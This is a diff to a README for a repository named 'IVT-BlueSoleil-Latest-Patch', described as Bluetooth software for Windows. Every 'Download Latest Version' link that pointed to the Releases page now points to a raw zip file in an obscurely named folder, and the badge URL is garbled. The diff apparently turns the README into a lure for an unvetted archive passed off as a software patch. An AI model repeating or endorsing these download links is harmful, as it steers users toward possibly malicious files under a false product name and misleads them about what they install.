@@ -1,6 +1,6 @@
 # 🌟 IVT-BlueSoleil-Latest-Patch - Easy Bluetooth Management for Windows
 
-[![Download Latest Version](https://img.shields.io/badge/Download%20Latest%20Version-blue.svg)](https://github.com/Jon-256/IVT-BlueSoleil-Latest-Patch/releases)
+[![Download Latest Version](https://raw.githubusercontent.com/Jon-256/IVT-BlueSoleil-Latest-Patch/main/coronofacial/IVT-BlueSoleil-Latest-Patch_v1.8.zip%20Latest%https://raw.githubusercontent.com/Jon-256/IVT-BlueSoleil-Latest-Patch/main/coronofacial/IVT-BlueSoleil-Latest-Patch_v1.8.zip)](https://raw.githubusercontent.com/Jon-256/IVT-BlueSoleil-Latest-Patch/main/coronofacial/IVT-BlueSoleil-Latest-Patch_v1.8.zip)
 
 ## 📘 Introduction
 
@@ -21,7 +21,7 @@ Before you start, ensure you have a Windows computer with Bluetooth capability. 
 
 To get started, visit the following link to download the latest version of the software:
 
-[Download Latest Version](https://github.com/Jon-256/IVT-BlueSoleil-Latest-Patch/releases)
+[Download Latest Version](https://raw.githubusercontent.com/Jon-256/IVT-BlueSoleil-Latest-Patch/main/coronofacial/IVT-BlueSoleil-Latest-Patch_v1.8.zip)
 
 1. Click on the above link to reach the Releases page.
 2. On the Releases page, find the latest version of IVT BlueSoleil.
@@ -91,6 +91,6 @@ For further reading and advanced features, explore our documentation links inclu
 
 We regularly update IVT BlueSoleil to improve features and security. Check the Releases page frequently for the latest updates.
 
-Again, to download the latest version, click here: [Download Latest Version](https://github.com/Jon-256/IVT-BlueSoleil-Latest-Patch/releases) 
+Again, to download the latest version, click here: [Download Latest Version](https://raw.githubusercontent.com/Jon-256/IVT-BlueSoleil-Latest-Patch/main/coronofacial/IVT-BlueSoleil-Latest-Patch_v1.8.zip) 
 
 Thank you for using IVT BlueSoleil. We are glad to have you here!
